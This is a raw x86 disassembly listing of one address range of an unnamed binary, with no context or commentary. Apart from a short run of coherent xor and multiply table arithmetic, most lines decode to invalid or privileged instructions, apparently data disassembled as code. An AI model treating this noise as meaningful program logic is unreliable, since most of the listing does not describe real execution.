  41c4b5:	scas   al,BYTE PTR es:[edi]
  41c4b6:	fnstsw WORD PTR [esp+ebx*2-0x2b0784d4]
  41c4bd:	lea    eax,[eax]
  41c4bf:	ins    BYTE PTR es:[edi],dx
  41c4c0:	add    DWORD PTR [ebp+edx*4+0x15d7260f],esp
  41c4c7:	adc    ebx,DWORD PTR [esi]
  41c4c9:	out    0x68,al
  41c4cb:	sahf   
  41c4cc:	or     al,bh
  41c4ce:	and    cl,BYTE PTR [eax+eiz*4]
  41c4d1:	fnstenv [ebx+0x46539cb4]
  41c4d7:	je     0x41c536
  41c4d9:	sub    DWORD PTR [ebp+0x53],edi
  41c4dc:	in     eax,0xe6
  41c4de:	jae    0x41c4c5
  41c4e0:	cmp    DWORD PTR [ebx+ebx*1],eax
  41c4e3:	dec    edx
  41c4e4:	xchg   dl,al
  41c4e6:	retf   0xb29a
  41c4e9:	ret    0x6d99
  41c4ec:	push   ecx
  41c4ed:	fsub   st(6),st
  41c4ef:	je     0x41c4bc
  41c4f1:	das    
  41c4f2:	cmp    eax,0xc75d2e22
  41c4f7:	imul   edi,esi,0x51
  41c4fa:	dec    ecx
  41c4fb:	lods   al,BYTE PTR ds:[esi]
  41c4fc:	icebp  
  41c4fd:	(bad)  
  41c4ff:	add    edi,ecx
  41c501:	imul   edx,DWORD PTR [eax-0x27b43df1],0x38
  41c508:	xchg   ebx,eax
  41c509:	rcl    DWORD PTR [eax+0x46],cl
  41c50c:	lods   eax,DWORD PTR ds:[esi]
  41c50d:	test   DWORD PTR [ecx-0x2773ab4d],ebx
  41c513:	mov    ds:0x9491a521,eax
  41c518:	pusha  
  41c519:	outs   dx,BYTE PTR ds:[esi]
  41c51a:	inc    esi
  41c51b:	sbb    edi,ebp
  41c51d:	adc    eax,0x18f20555
  41c522:	in     eax,dx
  41c523:	aaa    
  41c524:	call   0x2ba36ca2
  41c529:	inc    ecx
  41c52a:	aam    0xef
  41c52c:	(bad)  
  41c52d:	psrad  mm0,QWORD PTR [ebx+0x3b579bd0]
  41c534:	push   eax
  41c535:	in     al,dx
  41c536:	mov    ecx,DWORD PTR [edx+0x33]
  41c539:	bound  eax,QWORD PTR [ecx-0x9ceb57]
  41c53f:	fsub   QWORD PTR [esi+esi*1-0x6022d2be]
  41c546:	mov    DWORD PTR [eax+eiz*2-0x24b2f0ef],ebx
  41c54d:	cmp    DWORD PTR [eax+ebx*4],esp
  41c550:	int    0x83
  41c552:	push   esi
  41c553:	add    eax,0x937d0e14
  41c558:	xor    ah,BYTE PTR [ecx+0x7a9e3ffa]
  41c55e:	cmc    
  41c55f:	sbb    BYTE PTR [ecx],ch
  41c561:	mov    cs,WORD PTR [ebx-0x2a]
  41c564:	hlt    
  41c565:	je     0x41c55a
  41c567:	aas    
  41c568:	mov    al,0xab
  41c56a:	lock push ecx
  41c56c:	test   al,0x97
  41c56e:	mov    BYTE PTR [edi+0x7f],al
  41c571:	push   0xffffffb8
  41c573:	out    0x12,al
  41c575:	xor    ah,BYTE PTR [ebx-0x2ffa52a1]
  41c57b:	ins    BYTE PTR es:[edi],dx
  41c57c:	xchg   BYTE PTR [eax-0x2e],dh
  41c57f:	loop   0x41c5f7
  41c581:	sti    
  41c582:	sub    dh,BYTE PTR [ebx]
  41c584:	enter  0xd033,0x2b
  41c588:	retf   0xce2b
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	jmp    0x7de1:0xfe1f1a6f
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	adc    eax,0xc0a2af2
  41c5e1:	lock dec esi
  41c5e3:	push   eax
  41c5e4:	xchg   esp,eax
  41c5e5:	clc    
  41c5e6:	mov    esi,0xe76fbf38
  41c5eb:	rcr    DWORD PTR [ebx+esi*1],cl
  41c5ee:	fild   DWORD PTR [ebp+0x2dcc8df1]
  41c5f4:	inc    edi
  41c5f5:	in     al,0x5a
  41c5f7:	dec    eax
  41c5f8:	int    0xf
  41c5fa:	cwde   
  41c5fb:	daa    
  41c5fc:	push   0x948ebca6
  41c601:	jns    0x41c5d8
  41c603:	cmp    bl,BYTE PTR [eax+0x22]
  41c606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c607:	int    0x6f
  41c609:	pop    es
  41c60a:	dec    edx
  41c60b:	and    dh,bl
  41c60d:	popf   
  41c60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c60f:	add    bl,BYTE PTR [edi-0x3bdd0c8e]
  41c615:	and    eax,0x5fbeedf0
  41c61a:	inc    edx
  41c61b:	outs   dx,BYTE PTR ds:[esi]
  41c61c:	repnz shr BYTE PTR [ebp-0x36],1
  41c620:	ficom  WORD PTR [ecx+0x3b564bce]
  41c626:	es jo  0x41c5ba
  41c629:	pop    ss
  41c62a:	and    bh,BYTE PTR [ecx]
  41c62c:	cmp    edi,eax
  41c62e:	lahf   
  41c62f:	js     0x41c5ff
  41c631:	loope  0x41c5cb
  41c633:	cli    
  41c634:	dec    ebp
  41c635:	push   esi
  41c636:	xor    eax,edx
  41c638:	or     BYTE PTR [esp+ecx*1+0x2c],bh
  41c63c:	cmp    eax,0x8ef87532
  41c641:	pop    ebp
  41c642:	mov    ebx,0x69f82c7a
  41c647:	into   
  41c648:	push   ss
  41c649:	retf   
  41c64a:	mov    bh,0x94
  41c64c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c64d:	out    0xb5,al
  41c64f:	icebp  
  41c650:	add    al,0xb8
  41c652:	xor    eax,0x297c7c14
  41c657:	mov    esp,DWORD PTR [edi-0x34f327a8]
  41c65d:	fimul  WORD PTR [edi+0x55]
  41c660:	cli    
  41c661:	cmp    al,0x1d
  41c663:	sub    eax,ebp
  41c665:	dec    edi
  41c666:	out    0x2,eax
  41c668:	jno    0x41c6dc
  41c66a:	mov    edi,0x53000afd
  41c66f:	(bad)  
  41c670:	gs mov bl,0x19
  41c673:	test   BYTE PTR [edx+0x3c],cl
  41c676:	gs gs cmc 
  41c679:	pop    ss
  41c67a:	popa   
  41c67b:	push   eax
  41c67c:	mov    ds:0xb4f5c29,al
  41c681:	pop    esi
  41c682:	sub    eax,0x95e08bb0
  41c687:	jb     0x41c651
  41c689:	imul   eax,DWORD PTR [esi+0x4b8cb5e3],0x9a4f44c2
  41c693:	lahf   
  41c694:	aaa    
  41c695:	mov    WORD PTR [eax+0x69e7b832],ds
  41c69b:	push   ecx
  41c69c:	cmp    BYTE PTR [edx],dl
  41c69e:	in     eax,0xf9
  41c6a0:	mov    ebx,0x58612e96
  41c6a5:	(bad)  
  41c6a7:	jno    0x41c6de
  41c6a9:	sbb    edi,edi
  41c6ab:	jmp    0x153386fb
  41c6b0:	inc    ecx
  41c6b1:	es pushf 
  41c6b3:	shr    DWORD PTR [edi-0x36],1
  41c6b6:	mov    al,0x98
  41c6b8:	push   esp
  41c6b9:	push   0xffffffe1
  41c6bb:	or     eax,0xd0d0ef6d
  41c6c0:	in     eax,dx
  41c6c1:	pop    ebx
  41c6c2:	xor    al,ah
  41c6c4:	js     0x41c6a1
  41c6c6:	sbb    eax,0x7012610d
  41c6cb:	fst    DWORD PTR [edx-0x70]
  41c6ce:	pop    ecx
  41c6cf:	ret    
  41c6d0:	dec    edi
  41c6d1:	push   ebp
  41c6d2:	sti    
  41c6d3:	adc    BYTE PTR [ecx+0x30],0x6f
  41c6d7:	jno    0x41c70f
  41c6d9:	fidiv  WORD PTR [ebx-0x57d7e35a]
  41c6df:	or     bh,ah
  41c6e1:	icebp  
  41c6e2:	in     al,dx
  41c6e3:	(bad)  
  41c6e5:	xchg   ebp,eax
  41c6e6:	pop    ebx
  41c6e7:	xor    DWORD PTR [ecx],ebx
  41c6e9:	sbb    BYTE PTR [ecx-0x61de7237],ah
  41c6ef:	inc    esp
  41c6f0:	inc    esp
  41c6f1:	inc    ecx
  41c6f2:	pop    ss
  41c6f3:	mov    ebx,0xbe31b5a7
  41c6f8:	stos   BYTE PTR es:[edi],al
  41c6f9:	jg     0x41c68e
  41c6fb:	jmp    0x321b:0x2a11af4b
  41c702:	pop    ecx
  41c703:	shr    ah,0xb
  41c706:	push   esi
  41c707:	inc    ebx
  41c708:	dec    edi
  41c709:	(bad)  
  41c70a:	mov    ds:0x42ff838e,eax
  41c70f:	sub    al,0xef
  41c711:	aam    0xb9
  41c713:	jo     0x41c6ad
  41c715:	cmp    edx,DWORD PTR [ecx-0x4a2016ef]
  41c71b:	push   esi
  41c71c:	mov    esi,0x573b7639
  41c721:	dec    eax
  41c722:	mov    ds:0x85818547,al
  41c727:	imul   eax,DWORD PTR [edx-0x51],0x7f
  41c72b:	inc    ebx
  41c72c:	push   edi
  41c72d:	loopne 0x41c779
  41c72f:	dec    eax
  41c730:	pop    ebp
  41c731:	js     0x41c6fc
  41c733:	(bad)  
  41c734:	in     al,dx
  41c735:	mov    ds:0xd20b77af,eax
  41c73a:	inc    eax
  41c73b:	iret   
  41c73c:	push   es
  41c73d:	dec    esi
  41c73e:	adc    BYTE PTR [eax-0x5],0xc7
  41c742:	push   0xffffffd8
  41c744:	mov    esi,DWORD PTR [ecx+0x12]
  41c747:	fbld   TBYTE PTR [edi+0x75]
  41c74a:	bound  ebx,QWORD PTR [esi-0x7d]
  41c74d:	lods   eax,DWORD PTR ds:[esi]
  41c74e:	out    0xe4,al
  41c750:	icebp  
  41c751:	mov    ecx,0xed4273d5
  41c756:	inc    eax
  41c757:	dec    eax
  41c758:	inc    edi
  41c759:	fiadd  WORD PTR [edx-0x5877ae5f]
  41c75f:	cmp    DWORD PTR [ebp+0x205af51a],ebx
  41c765:	gs fmulp st(5),st
  41c768:	or     esp,edi
  41c76a:	mov    al,BYTE PTR [ebp+0x46f33331]
  41c770:	mov    dh,BYTE PTR [eax]
  41c772:	xor    DWORD PTR [ebp+ebp*1-0x74],edx
  41c776:	mov    bh,0xad
  41c778:	sti    
  41c779:	cmp    BYTE PTR [ecx],dh
  41c77b:	pop    eax
  41c77c:	jne    0x41c770
  41c77e:	neg    dh
  41c780:	nop
  41c781:	pop    ecx
  41c782:	mov    eax,ds:0xd746266e
  41c787:	repz and eax,DWORD PTR [esi]
  41c78a:	cmp    al,0x97
  41c78c:	(bad)  
  41c78d:	lock dec edi
  41c78f:	xchg   esi,eax
  41c790:	inc    esi
  41c791:	xor    al,0xc5
  41c793:	xchg   edx,eax
  41c794:	cmp    eax,0x9c336eb
  41c799:	mov    ds:0x24301e4e,eax
  41c79e:	mov    ecx,0xf3343b62
  41c7a3:	call   0x8d4e:0x285b8b90
  41c7aa:	jl     0x41c79f
  41c7ac:	aas    
  41c7ad:	add    cl,BYTE PTR [esi+0x6d53e170]
  41c7b3:	ror    DWORD PTR [edx+0x3b6e295c],cl
  41c7b9:	frstor [ecx+esi*4+0x8]
  41c7bd:	push   cs
  41c7be:	push   edx
  41c7bf:	push   0x5c
  41c7c1:	mov    dh,0x6c
  41c7c3:	stc    
  41c7c4:	fiadd  WORD PTR [eax+edx*1-0x3a]
  41c7c8:	adc    al,0xf9
  41c7ca:	data16 js 0x41c819
  41c7cd:	or     cl,BYTE PTR [ebp-0x4fc23bc2]
  41c7d3:	xor    al,0x60
  41c7d5:	cmc    
  41c7d6:	cs mov ecx,0xb1d2b76a
  41c7dc:	adc    al,0x2b
  41c7df:	jmp    0xa21f638c
  41c7e4:	aas    
  41c7e5:	mov    eax,ds:0x1db4f75a
  41c7ea:	ror    BYTE PTR [ebp-0x7a],0x29
  41c7ee:	push   ecx
  41c7ef:	xchg   ebx,eax
  41c7f0:	mov    dh,0xbf
  41c7f2:	cmp    eax,0x5f57439e
  41c7f7:	sub    DWORD PTR [ebx],ebp
  41c7f9:	ret    0xed4e
  41c7fc:	data16 (bad) 
  41c7fe:	mov    dh,0x6f
  41c800:	mov    BYTE PTR [ebp+ebp*1-0x75a38fd9],bh
  41c807:	(bad)
  41c80a:	inc    edx
  41c80b:	mov    ebp,ss
  41c80d:	rcr    BYTE PTR [ecx-0x2b404395],cl
  41c813:	push   ss
  41c814:	mov    ds:0x4ebab796,eax
  41c819:	mov    bh,0xe6
  41c81b:	xor    esi,ebx
  41c81d:	out    0x5f,eax
  41c81f:	addr16 add al,0x40
  41c822:	shl    BYTE PTR [edi],cl
  41c824:	lods   al,BYTE PTR ds:[esi]
  41c825:	mov    gs,WORD PTR [edx+0x37d032f5]
  41c82b:	mov    ch,0x7
  41c82d:	ja     0x41c7c1
  41c82f:	adc    DWORD PTR [edx-0x264e652e],eax
  41c835:	sbb    eax,DWORD PTR [eax]
  41c837:	(bad)  
  41c839:	mov    eax,ds:0x6658fa9f
  41c83e:	adc    BYTE PTR [ebp+0x4a],ch
  41c841:	push   edx
  41c842:	in     eax,0x66
  41c844:	add    eax,0x474e94ca
  41c849:	sbb    bl,bh
  41c84b:	mov    cl,0x94
  41c84d:	push   edi
  41c84e:	xchg   edx,eax
  41c84f:	ds fcom st(0)
  41c852:	dec    esp
  41c853:	add    eax,0x15923983
  41c858:	icebp  
  41c859:	ret    
  41c85a:	adc    eax,0x9098ecb0
  41c85f:	pop    eax
  41c860:	sub    al,0x8
  41c862:	hlt    
  41c863:	retf   0xa673
  41c866:	sub    edx,DWORD PTR [ebx-0xc]
  41c869:	push   esi
  41c86a:	in     eax,dx
  41c86b:	adc    edx,DWORD PTR [edi+0x5b]
  41c86e:	shl    DWORD PTR [edx-0x3b],cl
  41c871:	dec    edx
  41c872:	jmp    FWORD PTR [ebx+0x277031de]
  41c878:	fwait
  41c879:	jmp    0x41c83d
  41c87b:	in     eax,0x50
  41c87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c87e:	sbb    BYTE PTR [ebx+0x19],ah
  41c881:	push   esi
  41c882:	call   0xd374:0xae80d55c
  41c889:	call   0x785e:0xb0a54ae3
  41c890:	out    0xf0,al
  41c892:	dec    ecx
  41c893:	repnz shl DWORD PTR [ecx],1
  41c896:	sbb    esi,DWORD PTR [edx]
  41c898:	and    BYTE PTR ds:0xb3b21f27,cl
  41c89e:	nop
  41c89f:	jno    0x41c8c9
  41c8a1:	fdivr  DWORD PTR [ebp+0x61]
  41c8a4:	cdq    
  41c8a5:	push   ebp
  41c8a6:	inc    edi
  41c8a7:	mov    dh,0x2e
  41c8a9:	int    0x93
  41c8ab:	mov    ds:0x7f72958,eax
  41c8b0:	bound  ebp,QWORD PTR [esi+0x7014696f]
  41c8b6:	les    esp,FWORD PTR [ecx-0x68]
  41c8b9:	xchg   edx,eax
  41c8ba:	mov    ah,0xa7
  41c8bc:	rcr    BYTE PTR [esp+eax*8-0xcc9c031],cl
  41c8c3:	loope  0x41c919
  41c8c5:	test   ah,bl
  41c8c7:	mov    dh,0x13
  41c8c9:	xor    ch,BYTE PTR [edx-0x51]
  41c8cc:	int    0x17
  41c8ce:	mov    WORD PTR [edi-0x4f],cs
  41c8d1:	out    dx,al
  41c8d2:	adc    esp,ebx
  41c8d4:	rcr    DWORD PTR [ecx+0x73f61e8],cl
  41c8da:	adc    dh,BYTE PTR [eax+0x3d]
  41c8dd:	jg     0x41c898
  41c8df:	dec    ebp
  41c8e0:	push   ds
  41c8e1:	rcl    BYTE PTR [eax+ebp*8-0x31],cl
  41c8e5:	or     ecx,DWORD PTR [ebx+0x38d46a1e]
  41c8eb:	popa   
  41c8ec:	test   DWORD PTR [esi],ebx
  41c8ee:	dec    esi
  41c8ef:	jle    0x41c95c
  41c8f1:	aaa    
  41c8f2:	(bad)  
  41c8f3:	push   eax
  41c8f4:	add    eax,0x4e1bc363
  41c8f9:	push   es
  41c8fa:	pop    ecx
  41c8fb:	ret    0x79cb
  41c8fe:	ins    DWORD PTR es:[edi],dx
  41c8ff:	add    esp,ebx
  41c901:	ja     0x41c95f
  41c903:	popf   
  41c904:	push   ecx
  41c905:	lods   eax,DWORD PTR ds:[esi]
  41c906:	mov    bl,BYTE PTR [ebx+eax*8+0x79]
  41c90a:	in     eax,0x6b
  41c90c:	es add al,0x9f
  41c90f:	cmc    
  41c910:	cmp    eax,0x8ba66c77
  41c915:	and    edi,esi
  41c917:	lods   eax,DWORD PTR ds:[esi]
  41c918:	test   al,0x16
  41c91a:	dec    edi
  41c91b:	loope  0x41c91d
  41c91d:	jmp    FWORD PTR [ebx+0x53bad301]
  41c923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c924:	and    bl,BYTE PTR [edi+0x56]
  41c927:	mov    ah,0x84
  41c929:	add    al,0x31
  41c92b:	mov    eax,ds:0xce3981ce
  41c930:	ss daa 
  41c932:	fcomp  st(6)
  41c934:	inc    esi
  41c935:	call   0xc9150083
  41c93a:	mov    esp,0x64359a4a
  41c93f:	sub    DWORD PTR ds:0xc2da7951,esp
  41c945:	jbe    0x41c8cc
  41c947:	push   esi
  41c948:	retf   
  41c949:	nop
  41c94a:	test   dl,dl
  41c94c:	mov    ebx,0xb5e1dc4d
  41c951:	arpl   WORD PTR [edx-0x2e],bx
  41c954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c955:	xchg   ecx,eax
  41c956:	push   esp
  41c957:	gs jae 0x41c969
  41c95a:	popa   
  41c95b:	mov    esp,0x97c5a965
  41c960:	(bad)  
  41c961:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c963:	shl    DWORD PTR [ecx-0x435ddc1a],1
  41c969:	and    dh,BYTE PTR [ecx-0x5b]
  41c96c:	ret    0xa3ed
  41c96f:	jecxz  0x41c9ee
  41c971:	jmp    0xa1fe56da
  41c976:	outs   dx,BYTE PTR ds:[esi]
  41c977:	pusha  
  41c978:	stc    
  41c979:	adc    DWORD PTR [ebx+0x97e3d67],eax
  41c97f:	dec    ebx
  41c980:	sbb    edi,DWORD PTR [eax-0x64]
  41c983:	loop   0x41c95e
  41c985:	pop    ss
  41c986:	in     al,0x99
  41c988:	and    al,0x59
  41c98a:	pop    ds
  41c98b:	and    esp,edx
  41c98d:	(bad)  
  41c98e:	or     BYTE PTR [ebx-0x54f5497e],dl
  41c994:	cwde   
  41c995:	fidivr DWORD PTR [edx]
  41c997:	xchg   DWORD PTR [edx+ebp*8],edi
  41c99a:	jno    0x41c934
  41c99c:	js     0x41c952
  41c99e:	pop    eax
  41c99f:	sti    
  41c9a0:	retf   0xd033
  41c9a3:	push   esi
  41c9a4:	jno    0x41c9bf
  41c9a6:	sub    al,BYTE PTR [esp+eiz*4+0x71]
  41c9aa:	jo     0x41c99d
  41c9ac:	dec    cl
  41c9ae:	cmp    bh,dl
  41c9b0:	jge    0x41c9c0
  41c9b2:	or     esp,edi
  41c9b4:	repz xchg esp,eax
  41c9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b7:	out    0x68,eax
  41c9b9:	lods   eax,DWORD PTR ds:[esi]
  41c9ba:	sbb    ecx,esp
  41c9bc:	jmp    0x41ca18
  41c9be:	daa    
  41c9bf:	sbb    BYTE PTR [edx],ah
  41c9c1:	push   edi
  41c9c2:	daa    
  41c9c3:	cmp    al,0x9
  41c9c5:	(bad)
  41c9c8:	or     eax,0x678dfd2b
  41c9cd:	adc    ch,BYTE PTR [esi+0x48]
  41c9d0:	addr16 dec ebx
  41c9d2:	pop    eax
  41c9d3:	add    eax,0x3a47639c
  41c9d8:	sbb    DWORD PTR [esi+0x59],eax
  41c9db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9dc:	mov    ebp,0xc6d4dced
  41c9e1:	xor    bh,BYTE PTR [edx]
  41c9e3:	in     eax,0xef
  41c9e5:	or     eax,0x3bd34ae7
  41c9ea:	(bad)  [edi-0x77]
  41c9ed:	ret    0x22ad
  41c9f0:	adc    esi,0x5d8db3ae
  41c9f6:	popf   
  41c9f7:	push   edi
  41c9f8:	jp     0x41c980
  41c9fa:	pusha  
  41c9fb:	push   eax
  41c9fc:	pop    esi
  41c9fd:	shr    DWORD PTR [eax-0x64],cl
  41ca00:	loopne 0x41c9db
  41ca02:	aaa    
  41ca03:	adc    DWORD PTR [esi-0x3c3f8b5f],0xb1f1d55a
  41ca0d:	lods   al,BYTE PTR ds:[esi]
  41ca0e:	lahf   
  41ca0f:	pop    ss
  41ca10:	xor    BYTE PTR [eax-0x3a],0xd
  41ca14:	cmp    bh,bl
  41ca16:	sti    
  41ca17:	push   ds
  41ca18:	std    
  41ca19:	mov    esp,0x56593919
  41ca1e:	or     edx,DWORD PTR [eax]
  41ca20:	into   
  41ca21:	cmp    ah,cl
  41ca23:	popf   
  41ca24:	loope  0x41c9c9
  41ca26:	adc    bl,al
  41ca28:	xor    esp,esi
  41ca2a:	in     eax,dx
  41ca2b:	push   ss
  41ca2c:	mov    eax,0x5af028e2
  41ca31:	lods   al,BYTE PTR ds:[esi]
  41ca32:	cld    
  41ca33:	mov    ds:0x54d044af,al
  41ca38:	rcl    BYTE PTR [ecx+0x33],0xcb
  41ca3c:	in     eax,0x70
  41ca3e:	ret    
  41ca3f:	imul   ebp,DWORD PTR [esi],0xfffffffd
  41ca42:	lock sub edx,edx
  41ca45:	adc    dh,BYTE PTR ds:0x1a786264
  41ca4b:	inc    ecx
  41ca4c:	icebp  
  41ca4d:	mov    ds:0x95ee7d36,al
  41ca52:	or     eax,0x74796cc0
  41ca57:	mov    ds:0x87c8797e,al
  41ca5c:	push   esi
  41ca5d:	mov    al,ds:0xac329704
  41ca62:	sbb    bh,ch
  41ca64:	sbb    ebx,DWORD PTR [edi-0x32]
  41ca67:	jg     0x41ca02
  41ca69:	out    dx,al
  41ca6a:	retf   
  41ca6b:	xchg   edi,eax
  41ca6c:	adc    al,0xa9
  41ca6e:	cmp    ebx,ecx
  41ca70:	nop
  41ca71:	jl     0x41ca3e
  41ca73:	retf   
  41ca74:	mov    cs,esp
  41ca76:	gs int 0xd2
  41ca79:	(bad)  
  41ca7a:	push   ebp
  41ca7b:	outs   dx,DWORD PTR ds:[esi]
  41ca7c:	aas    
  41ca7d:	or     al,0x35
  41ca7f:	add    eax,0x46b6650d
  41ca84:	pusha  
  41ca85:	mov    al,BYTE PTR [esi]
  41ca87:	cmp    DWORD PTR [edi-0x6f07cfb7],0x14
  41ca8e:	push   ebx
  41ca8f:	cmp    BYTE PTR ds:0x2fc8e240,bh
  41ca95:	or     al,0x31
  41ca97:	pop    es
  41ca98:	scas   eax,DWORD PTR es:[edi]
  41ca99:	add    bh,0xc1
  41ca9c:	ins    DWORD PTR es:[edi],dx
  41ca9d:	pop    ebx
  41ca9e:	pop    es
  41ca9f:	aaa    
  41caa0:	sahf   
  41caa1:	dec    edi
  41caa2:	lahf   
  41caa3:	dec    esp
  41caa4:	icebp  
  41caa5:	ret    
  41caa6:	mov    cl,0xf8
  41caa8:	stos   DWORD PTR es:[edi],eax
  41caa9:	xchg   BYTE PTR [eax+eax*4],al
  41caac:	scas   eax,DWORD PTR es:[edi]
  41caad:	stos   DWORD PTR es:[edi],eax
  41caae:	repz xchg esi,eax
  41cab0:	mov    cl,BYTE PTR ds:0x6bb9d587
  41cab6:	push   edi
  41cab7:	bound  ebp,QWORD PTR [ebx+edi*1+0x1a7a390d]
  41cabe:	ins    DWORD PTR es:[edi],dx
  41cabf:	cmp    al,0xc6
  41cac1:	ins    DWORD PTR es:[edi],dx
  41cac2:	dec    ecx
  41cac3:	sbb    eax,0xea5f1971
  41cac8:	jbe    0x41cab9
  41caca:	loopne 0x41ca90
  41cacc:	mov    al,ds:0xf63ff3ee
  41cad1:	fmul   QWORD PTR [esi+0x649db58e]
  41cad7:	in     al,0x9e
  41cad9:	out    0xc1,al
  41cadb:	ja     0x41cb0b
  41cadd:	pushf  
  41cade:	les    edx,FWORD PTR [eax-0xfc204d2]
  41cae4:	dec    ecx
  41cae5:	jp     0x41cb0b
  41cae7:	outs   dx,BYTE PTR ds:[esi]
  41cae8:	mov    BYTE PTR ds:0xe2dbbad3,cl
  41caee:	xchg   esi,eax
  41caef:	ins    BYTE PTR es:[edi],dx
  41caf0:	int3   
  41caf1:	test   al,0x2e
  41caf3:	xor    DWORD PTR [edx],esp
  41caf5:	popf   
  41caf6:	int    0xe8
  41caf8:	inc    edx
  41caf9:	xor    eax,DWORD PTR [edx+eiz*2]
  41cafc:	rcl    BYTE PTR ds:0x53ddb37e,1
  41cb02:	inc    eax
  41cb03:	inc    esi
  41cb04:	mov    ebx,0xf0433f8d
  41cb09:	in     al,0xcc
  41cb0b:	jno    0x41ca90
  41cb0d:	dec    edx
  41cb0e:	repz inc eax
  41cb10:	ja     0x41cab0
  41cb12:	xor    al,0x1a
  41cb15:	(bad)  
  41cb16:	fucomip st,st(6)
  41cb18:	mov    ch,0x79
  41cb1a:	leave  
  41cb1b:	or     al,0x1c
  41cb1d:	test   eax,0x22fb8ed6
  41cb22:	pop    ebp
  41cb23:	leave  
  41cb24:	inc    ebp
  41cb25:	mov    al,ds:0xa04b81a0
  41cb2a:	push   ss
  41cb2b:	fwait
  41cb2c:	push   eax
  41cb2d:	push   cs
  41cb2e:	push   ecx
  41cb2f:	jb     0x41cacb
  41cb31:	mov    eax,0x2b2497ca
  41cb36:	jb     0x41cb54
  41cb38:	cwde   
  41cb39:	pushf  
  41cb3a:	pop    ebp
  41cb3b:	jns    0x41cadb
  41cb3d:	add    ch,cl
  41cb3f:	adc    al,0x46
  41cb41:	or     al,0x4d
  41cb43:	pop    ecx
  41cb44:	adc    al,0x64
  41cb46:	test   DWORD PTR [eax-0x61896114],edx
  41cb4c:	jmp    0x41cb41
  41cb4e:	cli    
  41cb4f:	cli    
  41cb50:	or     bl,BYTE PTR [edi-0x404d1b7a]
  41cb56:	(bad)  
  41cb57:	outs   dx,BYTE PTR ds:[esi]
  41cb58:	pop    ebp
  41cb59:	(bad)  [ecx-0x72]
  41cb5c:	jg     0x41cbab
  41cb5e:	sub    al,0x75
  41cb60:	scas   al,BYTE PTR es:[edi]
  41cb61:	inc    ebp
  41cb62:	adc    eax,0x7dbe355
  41cb67:	mov    ch,0xb8
  41cb69:	imul   ebp,edi,0xe834efea
  41cb6f:	call   0xeb4e:0xf7f1dd96
  41cb76:	mov    al,ds:0x489be9f2
  41cb7b:	cmc    
  41cb7c:	loop   0x41cb48
  41cb7e:	or     esp,DWORD PTR [edx]
  41cb80:	retf   0x9d03
  41cb83:	loop   0x41cb41
  41cb85:	in     al,0x1c
  41cb87:	sub    edx,edx
  41cb89:	xchg   ecx,eax
  41cb8a:	outs   dx,BYTE PTR ds:[esi]
  41cb8b:	mov    ecx,0xf27d122d
  41cb90:	jae    0x41cbaa
  41cb92:	cmc    
  41cb93:	jmp    0x65f3:0x4ac34ebb
  41cb9a:	scas   eax,DWORD PTR es:[edi]
  41cb9b:	xchg   edi,ebp
  41cb9d:	fnstenv [eax-0x5e]
  41cba0:	cmp    BYTE PTR [edi],bh
  41cba2:	or     DWORD PTR [ebp-0x77],ebp
  41cba5:	adc    bh,bh
  41cba7:	sbb    BYTE PTR [ebx+ecx*1+0xf],dl
  41cbab:	fs sbb al,0x70
  41cbae:	adc    bl,dl
  41cbb0:	inc    esi
  41cbb1:	shl    BYTE PTR [eax+0x1d889bbe],0xed
  41cbb8:	lods   al,BYTE PTR ds:[esi]
  41cbb9:	cli    
  41cbba:	pop    esp
  41cbbb:	out    0xbc,eax
  41cbbd:	aad    0x7f
  41cbbf:	rcl    BYTE PTR [edi+0x58],cl
  41cbc2:	jge    0x41cb97
  41cbc4:	sub    al,0x8b
  41cbc6:	jae    0x41cb78
  41cbc8:	cmp    edi,esi
  41cbca:	test   BYTE PTR [eax-0x5],al
  41cbcd:	into   
  41cbce:	sub    eax,0xf83196cc
  41cbd3:	div    DWORD PTR [eax+eax*1+0x4dc6e040]
  41cbda:	xor    bh,BYTE PTR [ebx]
  41cbdc:	int3   
  41cbdd:	ss push ecx
  41cbdf:	das    
  41cbe0:	jecxz  0x41cbf2
  41cbe2:	jno    0x41cb68
  41cbe4:	aam    0xc6
  41cbe6:	cmp    bl,BYTE PTR [ecx]
  41cbe8:	lods   al,BYTE PTR ds:[esi]
  41cbe9:	lods   al,BYTE PTR ds:[esi]
  41cbea:	popa   
  41cbeb:	mov    ecx,0x539e90d4
  41cbf0:	push   DWORD PTR [eax-0x3e]
  41cbf3:	cmp    eax,0xe8b695e3
  41cbf8:	inc    ecx
  41cbf9:	std    
  41cbfa:	sti    
  41cbfb:	imul   esi,eax,0xffffffff
  41cbfe:	je     0x41cc47
  41cc00:	retf   
  41cc01:	lea    eax,[ecx]
  41cc03:	xor    BYTE PTR [ebx],bh
  41cc05:	jl     0x41cc74
  41cc07:	dec    eax
  41cc08:	push   ss
